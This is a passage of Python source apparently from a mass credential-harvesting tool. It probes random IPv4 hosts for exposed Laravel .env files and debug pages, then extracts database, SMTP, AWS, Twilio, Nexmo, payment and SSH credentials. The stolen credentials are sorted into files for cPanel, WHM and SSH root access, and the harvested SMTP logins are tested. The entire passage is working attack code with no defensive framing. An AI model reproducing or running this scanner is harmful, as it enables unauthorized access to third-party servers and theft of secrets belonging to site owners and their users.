						remover = str(build).replace('\r', '')
						print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ SMTP [{mailhost}]"))
						save = open('Results/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					return True
			else:
				return False
		except:
			return False
	def get_database(self, text, url):
		try:
			if "DB_HOST" in text:
				if "DB_HOST=" in text:
					method = '/.env'
					try:
						db_host = reg('\nDB_HOST=(.*?)\n', text)[0]
					except:
						db_host = ''
					try:
						db_port = reg('\nDB_PORT=(.*?)\n', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('\nDB_DATABASE=(.*?)\n', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('\nDB_USERNAME=(.*?)\n', text)[0]
					except:
						db_user = ''
					try:
						db_pass = reg('\nDB_PASSWORD=(.*?)\n', text)[0]
					except:
						db_pass = ''
				elif "<td>DB_HOST</td>" in text:
					method = 'debug'
					try:
						db_host = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_host = ''
					try:
						db_port = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_user = ''
					try:
						db_pass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_pass = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_HOST: '+str(db_host)+'\nDB_PORT: '+str(db_port)+'\nDB_NAME: '+str(db_name)+'\nDB_USER: '+str(db_user)+'\nDB_PASS: '+str(db_pass)
				remover = str(build).replace('\r', '')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ DATABASE [{db_host}]"))
				save = open('Results/DATABASE.txt', 'a')
				save.write(remover+'\n')
				save.close()
				build_forchecker = str(url)+"|"+str(db_host)+"|"+str(db_port)+"|"+str(db_user)+"|"+str(db_pass)+"|"+str(db_name)
				build_forchecker2 = str(url)+"|22|"+str(db_user)+"|"+str(db_pass)
				remover2 = str(build_forchecker).replace('\r', '')
				remover3 = str(build_forchecker2).replace('\r', '')
				if str(db_user) == "root":
					save3 = open('Results/forchecker/database_WHM.txt','a')
				else:
					save3 = open('Results/forchecker/database_Cpanels.txt','a')
				save3.write(remover2+'\n')
				save3.close()
				if str(db_user) == "root":
					save4 = open('Results/forchecker/database_ssh_root.txt','a')
				else:
					save4 = open('Results/forchecker/database_ssh.txt','a')
				save4.write(remover3+'\n')
				save4.close()
				return True
			else:
				return False
		except:
			return False
	def get_database2(self, text, url):
		pm = pma(url)
		pmp = pm.check()
		if 'DB_USERNAME=' in text:
			method = '/.env'
			db_host = re.findall('\nDB_HOST=(.*?)\n', text)[0]
			db_dbse = re.findall('\nDB_DATABASE=(.*?)\n', text)[0]
			db_user = re.findall('\nDB_USERNAME=(.*?)\n', text)[0]
			db_pass = re.findall('\nDB_PASSWORD=(.*?)\n', text)[0]
			build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\n'
			if pmp:
				build += 'PMA: ' + str(pmp) + '\n'
			build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: ' + str(db_user) + '\nPASSWORD: ' + str(db_pass) + '\n'
			remover = str(build).replace('\r', '')
			if pmp:
				fp = open('Results/phpmyadmin.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
			else:
				fp = open('Results/database_PMA.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
		elif '<td>DB_USERNAME</td>' in text:
			method = 'debug'
			db_host = re.findall('<td>DB_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_dbse = re.findall('<td>DB_DATABASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_user = re.findall('<td>DB_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_pass = re.findall('<td>DB_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\n'
			if pmp:
				build += 'PMA: ' + str(pmp) + '\n'
			build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: ' + str(db_user) + '\nPASSWORD: ' + str(db_pass) + '\n'
			remover = str(build).replace('\r', '')
			if pmp:
				fp = open('Results/phpmyadmin.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
			else:
				fp = open('Results/database.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
		return pmp

def printfa(text):
	''.join([str(item) for item in text])
	print(text),


def legalegion(url):
	global progres
	resp = False
	try:
		paths = env_path
		for path in paths:
			try:
				payload = f"{url}/{path}"
				text = f'# {url}{path}'
				headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
				get_source = requests.get(payload, headers=headers, timeout=5, verify=False, allow_redirects=False).text
				if "APP_KEY=" in get_source or "DB_PASSWORD=" in get_source:
					resp = get_source
				else:
					get_source = requests.post(payload, data={"0x01[]":"legion"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
					if "<td>APP_KEY</td>" in get_source:
						resp = get_source
				if resp:
					remover2 = str(url).replace('\r', '')
					save3 = open('Results/logsites/vulnerable.txt','a')
					save3.write(remover2+'\n')
					save3.close()
					rawmode = legion().get_raw_mode(resp, url)
					manual = legion().get_manual(resp, url)
					getappkey = legion().get_appkey(resp, url)
					getmailgun = legion().get_mailgun(resp, url)
					getsmtp = legion().get_smtp(resp, url)
					getwtilio = legion().get_twillio(resp, url)
					smsapi = legion().get_nexmo(resp, url)
					getaws = legion().get_aws_data(resp, url)
					getpp = legion().payment_api(resp, url)
					getdb = legion().get_database(resp, url)
					getdb2 = legion().get_database2(resp, url)
					getssh1 = legion().getSSH(resp, url)
					getwtilio2 = legion().get_nexmo2(resp, url)

				else:
					text += ' | Can\'t get everything'
					save = open('Results/logsites/not_vulnerable.txt','a')
					asu = str(payload).replace('\r', '')
					save.write(asu+'\n')
					save.close()
			except:
				text = '# '+payload
				text += ' | Can\'t access sites'
				save = open('Results/logsites/exception_sites.txt','a')
				asu = str(payload).replace('\r', '')
				save.write(asu+'\n')
				save.close()

			progres = progres + 1
			printfa(Colorate.Horizontal(Colors.yellow_to_red,f'[{ntime()}] [{str(progres)}] {text}'))
	except:
		pass



th = threading.Thread(target=send_worker)
th.setDaemon(True)
th.start()

threads = [th]

try:
    for _ in range(thread):
        th = threading.Thread(target=worker)
        th.setDaemon(True)
        th.start()

        threads.append(th)

    for line in rand_v4():
        while q.qsize() > thread:
            continue
        q.put(line)

    q.join()

except:
    pass

try:
    stop = True
    for i in threads:
        if i.is_alive() and not q.empty():
            print("\x1b[93m%s\x1b[0m: waiting for the data to finish processing" % i.name)
            i.join()
except:
    pass
